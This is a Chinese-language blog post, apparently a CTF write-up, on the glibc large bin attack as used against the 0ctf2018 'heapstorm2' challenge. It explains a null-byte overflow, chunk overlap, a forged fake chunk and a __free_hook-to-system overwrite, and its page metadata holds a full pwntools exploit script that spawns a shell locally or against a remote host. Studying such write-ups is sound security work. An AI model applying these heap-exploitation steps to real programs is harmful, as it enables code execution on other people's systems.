<!doctype html><html lang=zh-cn dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>How2heap--large_bin_attack 0ctf2018--heapstorm2 | hhdx's blog</title>
<meta name=keywords content="CTF,how2heap"><meta name=description content="large bin attack
对已存在于large bin中的chunk的bk、bk_nextsize字段进行更改，在unsorted bin中取出插入该large bin时，会将bk->fd、bk_nextsize->fd_nextsize的位置覆盖成chunk的地址。涉及的代码就是unsorted bin遍历取出插入那块。和先前的unsorted bin attack类似，通常为进一步攻击做准备，如修改global_max_fast。
这里比较难理解就是large bin的结构，特别是先前我被一个large bin结构图所误导，下面给出我画的结构图（如果有错误o((⊙﹏⊙))o，请帮忙指出）。

0ctf2018 heapstorm2


1
2
3
4
5


Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      PIE enabled


功能分析
程序首先使用mallopt函数将global_max_fast设置为0，也就是不使用fastbin。"><meta name=author content="hhdx"><link rel=canonical href=https://hhdx.xyz/post/how2heap-large-bin-attack-0ctf2018-heapstorm2/><link crossorigin=anonymous href=/assets/css/stylesheet.fc220c15db4aef0318bbf30adc45d33d4d7c88deff3238b23eb255afdc472ca6.css integrity="sha256-/CIMFdtK7wMYu/MK3EXTPU18iN7/MjiyPrJVr9xHLKY=" rel="preload stylesheet" as=style><link rel=icon href=https://hhdx.xyz/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://hhdx.xyz/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://hhdx.xyz/favicon-32x32.png><link rel=apple-touch-icon href=https://hhdx.xyz/apple-touch-icon.png><link rel=mask-icon href=https://hhdx.xyz/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=zh-cn href=https://hhdx.xyz/post/how2heap-large-bin-attack-0ctf2018-heapstorm2/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:url" content="https://hhdx.xyz/post/how2heap-large-bin-attack-0ctf2018-heapstorm2/"><meta property="og:site_name" content="hhdx's blog"><meta property="og:title" content="How2heap--large_bin_attack 0ctf2018--heapstorm2"><meta property="og:description" content="large bin attack 对已存在于large bin中的chunk的bk、bk_nextsize字段进行更改，在unsorted bin中取出插入该large bin时，会将bk->fd、bk_nextsize->fd_nextsize的位置覆盖成chunk的地址。涉及的代码就是unsorted bin遍历取出插入那块。和先前的unsorted bin attack类似，通常为进一步攻击做准备，如修改global_max_fast。
这里比较难理解就是large bin的结构，特别是先前我被一个large bin结构图所误导，下面给出我画的结构图（如果有错误o((⊙﹏⊙))o，请帮忙指出）。
0ctf2018 heapstorm2 1 2 3 4 5 Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled 功能分析 程序首先使用mallopt函数将global_max_fast设置为0，也就是不使用fastbin。"><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="post"><meta property="article:published_time" content="2020-07-18T21:10:54+00:00"><meta property="article:modified_time" content="2020-07-18T21:10:54+00:00"><meta property="article:tag" content="CTF"><meta property="article:tag" content="How2heap"><meta name=twitter:card content="summary"><meta name=twitter:title content="How2heap--large_bin_attack 0ctf2018--heapstorm2"><meta name=twitter:description content="large bin attack
对已存在于large bin中的chunk的bk、bk_nextsize字段进行更改，在unsorted bin中取出插入该large bin时，会将bk->fd、bk_nextsize->fd_nextsize的位置覆盖成chunk的地址。涉及的代码就是unsorted bin遍历取出插入那块。和先前的unsorted bin attack类似，通常为进一步攻击做准备，如修改global_max_fast。
这里比较难理解就是large bin的结构，特别是先前我被一个large bin结构图所误导，下面给出我画的结构图（如果有错误o((⊙﹏⊙))o，请帮忙指出）。

0ctf2018 heapstorm2


1
2
3
4
5


Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      PIE enabled


功能分析
程序首先使用mallopt函数将global_max_fast设置为0，也就是不使用fastbin。"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://hhdx.xyz/post/"},{"@type":"ListItem","position":2,"name":"How2heap--large_bin_attack 0ctf2018--heapstorm2","item":"https://hhdx.xyz/post/how2heap-large-bin-attack-0ctf2018-heapstorm2/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"How2heap--large_bin_attack 0ctf2018--heapstorm2","name":"How2heap--large_bin_attack 0ctf2018--heapstorm2","description":"large bin attack 对已存在于large bin中的chunk的bk、bk_nextsize字段进行更改，在unsorted bin中取出插入该large bin时，会将bk-\u0026gt;fd、bk_nextsize-\u0026gt;fd_nextsize的位置覆盖成chunk的地址。涉及的代码就是unsorted bin遍历取出插入那块。和先前的unsorted bin attack类似，通常为进一步攻击做准备，如修改global_max_fast。\n这里比较难理解就是large bin的结构，特别是先前我被一个large bin结构图所误导，下面给出我画的结构图（如果有错误o((⊙﹏⊙))o，请帮忙指出）。\n0ctf2018 heapstorm2 1 2 3 4 5 Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled 功能分析 程序首先使用mallopt函数将global_max_fast设置为0，也就是不使用fastbin。\n","keywords":["CTF","how2heap"],"articleBody":"large bin attack 对已存在于large bin中的chunk的bk、bk_nextsize字段进行更改，在unsorted bin中取出插入该large bin时，会将bk-\u003efd、bk_nextsize-\u003efd_nextsize的位置覆盖成chunk的地址。涉及的代码就是unsorted bin遍历取出插入那块。和先前的unsorted bin attack类似，通常为进一步攻击做准备，如修改global_max_fast。\n这里比较难理解就是large bin的结构，特别是先前我被一个large bin结构图所误导，下面给出我画的结构图（如果有错误o((⊙﹏⊙))o，请帮忙指出）。\n0ctf2018 heapstorm2 1 2 3 4 5 Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled 功能分析 程序首先使用mallopt函数将global_max_fast设置为0，也就是不使用fastbin。\n程序在0x13370800~0x13370818读入了0x18字节的随机数字，0x13370818复制了0x13370810处的8字节。0x13370800处的随机数用来异或模糊pointer，0x13370808处的随机数用来异或模糊size。0x13370810和0x13370818两处在view函数中用到。0x13370820后面用来存储结构体数组，结构体如下\n1 2 3 4 5 6 ===== HEAP STORM II ===== 1. Allocate 2. Update 3. Delete 4. View 5. Exit Allocate：分配size大小的空间，指针与大小在和随机数异或后，存储在数组中。\nUpdate：对分配中得空间中的数据进行更新，大小只能小于等于size-12。这里存在null byte overflow\nDelete：释放分配的空间，并清空结构体。\nView：当*(unsigned long*)0x13370810 ^ *(unsigned long*)0x13370818 = 0x13377331输出空间内容，而初始时候这个位置内容一样。\n总体思路 null byte overflow造成堆块重叠，large bin attack在0x13370800前面构造fake chunk，将fake_chunk链接到unsorted bin上，使用一个正好的大小分配得到此chunk，对随机数和数组进行改写，最后修改__free_hook获得shell。\nnull byte overflow 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 allocate(0x20) # 0 allocate(0x400) # 1 allocate(0x28) # 2 allocate(0xf10) # 3 allocate(0x20) # 4 update(3, 0xef8, b\"A\"*0xef0 + p64(0xf00)) delete(3) update(2, 0x28-12, b\"A\"*(0x28-12)) allocate(0x20) # 3 allocate(0x20) # 5 allocate(0x400) # 6 allocate(0x20) # 7 allocate(0x400) # 8 allocate(0x20) # 9 delete(3) delete(4) delete(6) delete(8) 在3的内部构造后续使用的presize，释放3，溢出2覆盖3的size（0xf20-\u003e0xf00），然后分配一些块供后续使用。delete(4)后，这一大块合并入topchunk。\nlarge bin attack null byte overflow后，unsorted bin中有：0x411-\u003e0x411-\u003e0x621。\n1 2 3 4 5 6 7 8 9 10 11 12 allocate(0x500) # 3 allocate(0x500) # 4 update(4, 0x80, b\"A\"*0x58 + p64(0x401) + p64(0) + p64(0x13370800-0x20+3) + p64(0) + p64(0x13370800+8-0x20)) delete(1) allocate(0x20) # 1 update(4, 0x90, b\"A\"*0x28 + p64(0x31) + b\"A\"*0x28 + p64(0x31) + b\"A\"*0x28 + p64(0x31)) delete(5) update(4, 0x40, b\"A\"*0x28 + p64(0x31) + p64(0x13370800-0x10)*2) allocate(0x48) # 5 分配块3，将0x621块割裂，并将两个0x411块放入到large bin中。再分配块4，就将从topchunk中割出，出现重叠。\n通过对块4进行update，将large bin中的首块（称之为victim）内容进行了更新，将它的victim-\u003esize修改为0x401，victim-\u003ebk修改为0x13370800-0x20+3，victim-\u003ebk_nextsize修改为0x13370800+8-0x20。之后再有更大的chunk（称之为larger）进入large bin时，就将有以下操作\n1 2 victim-\u003ebk-\u003efd = larger; victim-\u003ebk_nextsize-\u003efd_nextsize = larger; large bin attack之后：\n1 2 3 0x133707e0:\t0x0000000000000000\t0x0000000000000000 0x133707f0:\t0x55fb4c7030000000\t0x0000000000000056 0x13370800:\t0x3269f037bee796f9\t0x00005655fb4c7030 这时候，0x133707f0就能够当做一个chunk的起始地址。需要随机到heap最高有效字节为0x56，因为calloc分配完成后有检查。0x56就能够满足chunk_is_mmapped (mem2chunk (mem))这个条件。\n1 2 3 4 mem = _int_malloc (av, sz); assert (!mem || chunk_is_mmapped (mem2chunk (mem)) || av == arena_for_chunk (mem2chunk (mem))); fake unsorted bin 将unsorted bin中的某一chunk的fd、bk修改为0x133707f0，分配0x48就能将0x56的chunk分配出来。\nunsorted bin从尾部往头部依次遍历，将其放入对应的bin或将其分配。从unsorted bin中取出时，有以下操作，所以得保证bk-\u003efd是个可写的位置。\n1 2 3 /* remove from unsorted list */ unsorted_chunks (av)-\u003ebk = bck; bck-\u003efd = unsorted_chunks (av); 后续操作 改写数组，泄露heap_base地址，通过chunk中存储的bk、fd泄露libc_base，将__free_hook改成system地址。\nexploit exp\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 #!/usr/bin/env python3 from pwn import * context(os=\"linux\", arch=\"amd64\", log_level=\"debug\") localfile = \"./heapstorm2\" locallibc = \"../glibc_versions/2.26/x64_notcache/lib/libc-2.26.so\" def allocate(size): io.recvuntil(\"Command: \") io.sendline(str(1)) io.recvuntil(\"Size: \") io.sendline(str(size)) def update(idx, size, content): io.recvuntil(\"Command: \") io.sendline(str(2)) io.recvuntil(\"Index: \") io.sendline(str(idx)) io.recvuntil(\"Size: \") io.sendline(str(size)) io.recvuntil(\"Content: \") io.send(content) def delete(idx): io.recvuntil(\"Command: \") io.sendline(str(3)) io.recvuntil(\"Index: \") io.sendline(str(idx)) def view(idx): io.recvuntil(\"Command: \") io.sendline(str(4)) io.recvuntil(\"Index: \") io.sendline(str(idx)) def exp(): allocate(0x20) # 0 allocate(0x400) # 1 allocate(0x28) # 2 allocate(0xf10) # 3 allocate(0x20) # 4 update(3, 0xef8, b\"A\"*0xef0 + p64(0xf00)) delete(3) update(2, 0x28-12, b\"A\"*(0x28-12)) allocate(0x20) # 3 allocate(0x20) # 5 allocate(0x400) # 6 allocate(0x20) # 7 allocate(0x400) # 8 allocate(0x20) # 9 delete(3) delete(4) delete(6) delete(8) allocate(0x500) # 3 allocate(0x500) # 4 update(4, 0x80, b\"A\"*0x58 + p64(0x401) + p64(0) + p64(0x13370800-0x20+3) + p64(0) + p64(0x13370800+8-0x20)) delete(1) allocate(0x20) # 1 update(4, 0x90, b\"A\"*0x28 + p64(0x31) + b\"A\"*0x28 + p64(0x31) + b\"A\"*0x28 + p64(0x31)) delete(5) update(4, 0x40, b\"A\"*0x28 + p64(0x31) + p64(0x13370800-0x10)*2) allocate(0x48) # 5 update(5, 0x30, p64(0)*3 + p64(0x13377331) + p64(0x13370830) + p64(0x100)) update(0, 0x10, p64(0x133707f3) + p64(0x8)) view(1) io.recvuntil(\"Chunk[1]: \") heap_base = u64(io.recv(8)) - 0x30 update(0, 0x10, p64(heap_base+0x4a0+0x10) + p64(0x8)) log.debug(\"heap: 0x%x\" % (heap_base+0x4a0+0x10)) view(1) io.recvuntil(\"Chunk[1]: \") libc_base = u64(io.recv(8)) - 0x3ABC80 update(0, 0x10, p64(libc_base+libc.sym[\"__free_hook\"]) + p64(0x20)) update(1, 0x8, p64(libc_base+libc.sym[\"system\"])) log.debug(\"system: 0x%x\" % (libc_base+libc.sym[\"system\"])) # gdb.attach(io, \"b *$rebase(0x1331)\") update(0, 8, b\"/bin/sh\\x00\") delete(0) io.interactive() argc = len(sys.argv) if argc == 1: io = process(localfile) else: if argc == 2: host, port = sys.argv[1].split(\":\") elif argc == 3: host = sys.argv[1] port = sys.argv[2] io = remote(host, port) elf = ELF(localfile) libc = ELF(locallibc) exp() reference how2heap large_bin_attack.c https://dangokyo.me/2018/04/07/0ctf-2018-pwn-heapstorm2-write-up/ https://eternalsakura13.com/2018/04/03/heapstorm2/ ","wordCount":"2159","inLanguage":"zh-cn","datePublished":"2020-07-18T21:10:54Z","dateModified":"2020-07-18T21:10:54Z","author":{"@type":"Person","name":"hhdx"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://hhdx.xyz/post/how2heap-large-bin-attack-0ctf2018-heapstorm2/"},"publisher":{"@type":"Organization","name":"hhdx's blog","logo":{"@type":"ImageObject","url":"https://hhdx.xyz/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://hhdx.xyz/ accesskey=h title="hhdx's blog (Alt + H)">hhdx's blog</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://hhdx.xyz/ title=主页><span>主页</span></a></li><li><a href=https://hhdx.xyz/post/ title=归档><span>归档</span></a></li><li><a href=https://hhdx.xyz/tags/ title=标签><span>标签</span></a></li><li><a href=https://hhdx.xyz/underway/ title=施工中><span>施工中</span></a></li><li><a href=https://hhdx.xyz/about/ title=关于><span>关于</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class="post-title entry-hint-parent">How2heap--large_bin_attack 0ctf2018--heapstorm2</h1><div class=post-meta><span title='2020-07-18 21:10:54 +0000 UTC'>July 18, 2020</span>&nbsp;·&nbsp;hhdx</div></header><div class=post-content><h2 id=large-bin-attack>large bin attack<a hidden class=anchor aria-hidden=true href=#large-bin-attack>#</a></h2><p>对已存在于large bin中的chunk的bk、bk_nextsize字段进行更改，在unsorted bin中取出插入该large bin时，会将bk->fd、bk_nextsize->fd_nextsize的位置覆盖成chunk的地址。涉及的代码就是unsorted bin遍历取出插入那块。和先前的unsorted bin attack类似，通常为进一步攻击做准备，如修改global_max_fast。</p><p>这里比较难理解就是large bin的结构，特别是先前我被一个<a href=https://raw.githubusercontent.com/clxsh/pics/master/img/largebin.png>large bin结构图</a>所误导，下面给出我画的结构图（如果有错误o((⊙﹏⊙))o，请帮忙指出）。</p><p><img alt="glibc large bin" loading=lazy src=https://raw.githubusercontent.com/clxsh/pics/master/img/large_bin2.png></p><h2 id=0ctf2018-heapstorm2>0ctf2018 heapstorm2<a hidden class=anchor aria-hidden=true href=#0ctf2018-heapstorm2>#</a></h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Arch:     amd64-64-little
</span></span><span class=line><span class=cl>RELRO:    Full RELRO
</span></span><span class=line><span class=cl>Stack:    Canary found
</span></span><span class=line><span class=cl>NX:       NX enabled
</span></span><span class=line><span class=cl>PIE:      PIE enabled
</span></span></code></pre></td></tr></table></div></div><h3 id=功能分析>功能分析<a hidden class=anchor aria-hidden=true href=#功能分析>#</a></h3><p>程序首先使用mallopt函数将global_max_fast设置为0，也就是不使用fastbin。</p><p>程序在0x13370800~0x13370818读入了0x18字节的随机数字，0x13370818复制了0x13370810处的8字节。0x13370800处的随机数用来异或模糊pointer，0x13370808处的随机数用来异或模糊size。0x13370810和0x13370818两处在view函数中用到。0x13370820后面用来存储结构体数组，结构体如下</p><p><img alt=image-20200719114215579 loading=lazy src=https://raw.githubusercontent.com/clxsh/pics/master/img/image-20200719114215579.png></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>===== HEAP STORM II =====
</span></span><span class=line><span class=cl>1. Allocate
</span></span><span class=line><span class=cl>2. Update
</span></span><span class=line><span class=cl>3. Delete
</span></span><span class=line><span class=cl>4. View
</span></span><span class=line><span class=cl>5. Exit
</span></span></code></pre></td></tr></table></div></div><p>Allocate：分配size大小的空间，指针与大小在和随机数异或后，存储在数组中。</p><p>Update：对分配中得空间中的数据进行更新，大小只能小于等于size-12。这里存在null byte overflow</p><p>Delete：释放分配的空间，并清空结构体。</p><p>View：当<code>*(unsigned long*)0x13370810 ^ *(unsigned long*)0x13370818 = 0x13377331</code>输出空间内容，而初始时候这个位置内容一样。</p><h3 id=总体思路>总体思路<a hidden class=anchor aria-hidden=true href=#总体思路>#</a></h3><p>null byte overflow造成堆块重叠，large bin attack在0x13370800前面构造fake chunk，将fake_chunk链接到unsorted bin上，使用一个正好的大小分配得到此chunk，对随机数和数组进行改写，最后修改<code>__free_hook</code>获得shell。</p><h3 id=null-byte-overflow>null byte overflow<a hidden class=anchor aria-hidden=true href=#null-byte-overflow>#</a></h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>allocate</span><span class=p>(</span><span class=mh>0x20</span><span class=p>)</span>      <span class=c1># 0</span>
</span></span><span class=line><span class=cl><span class=n>allocate</span><span class=p>(</span><span class=mh>0x400</span><span class=p>)</span>     <span class=c1># 1</span>
</span></span><span class=line><span class=cl><span class=n>allocate</span><span class=p>(</span><span class=mh>0x28</span><span class=p>)</span>      <span class=c1># 2</span>
</span></span><span class=line><span class=cl><span class=n>allocate</span><span class=p>(</span><span class=mh>0xf10</span><span class=p>)</span>     <span class=c1># 3</span>
</span></span><span class=line><span class=cl><span class=n>allocate</span><span class=p>(</span><span class=mh>0x20</span><span class=p>)</span>      <span class=c1># 4</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>update</span><span class=p>(</span><span class=mi>3</span><span class=p>,</span> <span class=mh>0xef8</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;A&#34;</span><span class=o>*</span><span class=mh>0xef0</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0xf00</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>update</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span> <span class=mh>0x28</span><span class=o>-</span><span class=mi>12</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;A&#34;</span><span class=o>*</span><span class=p>(</span><span class=mh>0x28</span><span class=o>-</span><span class=mi>12</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>allocate</span><span class=p>(</span><span class=mh>0x20</span><span class=p>)</span>      <span class=c1># 3</span>
</span></span><span class=line><span class=cl><span class=n>allocate</span><span class=p>(</span><span class=mh>0x20</span><span class=p>)</span>      <span class=c1># 5</span>
</span></span><span class=line><span class=cl><span class=n>allocate</span><span class=p>(</span><span class=mh>0x400</span><span class=p>)</span>     <span class=c1># 6</span>
</span></span><span class=line><span class=cl><span class=n>allocate</span><span class=p>(</span><span class=mh>0x20</span><span class=p>)</span>      <span class=c1># 7</span>
</span></span><span class=line><span class=cl><span class=n>allocate</span><span class=p>(</span><span class=mh>0x400</span><span class=p>)</span>     <span class=c1># 8</span>
</span></span><span class=line><span class=cl><span class=n>allocate</span><span class=p>(</span><span class=mh>0x20</span><span class=p>)</span>      <span class=c1># 9</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>4</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>6</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>8</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>在3的内部构造后续使用的presize，释放3，溢出2覆盖3的size（0xf20->0xf00），然后分配一些块供后续使用。delete(4)后，这一大块合并入topchunk。</p><h3 id=large-bin-attack-1>large bin attack<a hidden class=anchor aria-hidden=true href=#large-bin-attack-1>#</a></h3><p>null byte overflow后，unsorted bin中有：0x411->0x411->0x621。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>allocate</span><span class=p>(</span><span class=mh>0x500</span><span class=p>)</span>     <span class=c1># 3</span>
</span></span><span class=line><span class=cl><span class=n>allocate</span><span class=p>(</span><span class=mh>0x500</span><span class=p>)</span>     <span class=c1># 4</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>update</span><span class=p>(</span><span class=mi>4</span><span class=p>,</span> <span class=mh>0x80</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;A&#34;</span><span class=o>*</span><span class=mh>0x58</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x401</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x13370800</span><span class=o>-</span><span class=mh>0x20</span><span class=o>+</span><span class=mi>3</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x13370800</span><span class=o>+</span><span class=mi>8</span><span class=o>-</span><span class=mh>0x20</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>allocate</span><span class=p>(</span><span class=mh>0x20</span><span class=p>)</span>      <span class=c1># 1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>update</span><span class=p>(</span><span class=mi>4</span><span class=p>,</span> <span class=mh>0x90</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;A&#34;</span><span class=o>*</span><span class=mh>0x28</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x31</span><span class=p>)</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;A&#34;</span><span class=o>*</span><span class=mh>0x28</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x31</span><span class=p>)</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;A&#34;</span><span class=o>*</span><span class=mh>0x28</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x31</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>5</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>update</span><span class=p>(</span><span class=mi>4</span><span class=p>,</span> <span class=mh>0x40</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;A&#34;</span><span class=o>*</span><span class=mh>0x28</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x31</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x13370800</span><span class=o>-</span><span class=mh>0x10</span><span class=p>)</span><span class=o>*</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>allocate</span><span class=p>(</span><span class=mh>0x48</span><span class=p>)</span>      <span class=c1># 5</span>
</span></span></code></pre></td></tr></table></div></div><p>分配块3，将0x621块割裂，并将两个0x411块放入到large bin中。再分配块4，就将从topchunk中割出，出现重叠。</p><p>通过对块4进行update，将large bin中的首块（称之为victim）内容进行了更新，将它的<code>victim->size</code>修改为0x401，<code>victim->bk</code>修改为<code>0x13370800-0x20+3</code>，<code>victim->bk_nextsize</code>修改为<code>0x13370800+8-0x20</code>。之后再有更大的chunk（称之为larger）进入large bin时，就将有以下操作</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=n>victim</span><span class=o>-&gt;</span><span class=n>bk</span><span class=o>-&gt;</span><span class=n>fd</span> <span class=o>=</span> <span class=n>larger</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=n>victim</span><span class=o>-&gt;</span><span class=n>bk_nextsize</span><span class=o>-&gt;</span><span class=n>fd_nextsize</span> <span class=o>=</span> <span class=n>larger</span><span class=p>;</span>
</span></span></code></pre></td></tr></table></div></div><p>large bin attack之后：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>0x133707e0:	0x0000000000000000	0x0000000000000000
</span></span><span class=line><span class=cl>0x133707f0:	0x55fb4c7030000000	0x0000000000000056
</span></span><span class=line><span class=cl>0x13370800:	0x3269f037bee796f9	0x00005655fb4c7030
</span></span></code></pre></td></tr></table></div></div><p>这时候，0x133707f0就能够当做一个chunk的起始地址。需要随机到heap最高有效字节为0x56，因为calloc分配完成后有检查。0x56就能够满足<code>chunk_is_mmapped (mem2chunk (mem))</code>这个条件。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=n>mem</span> <span class=o>=</span> <span class=nf>_int_malloc</span> <span class=p>(</span><span class=n>av</span><span class=p>,</span> <span class=n>sz</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
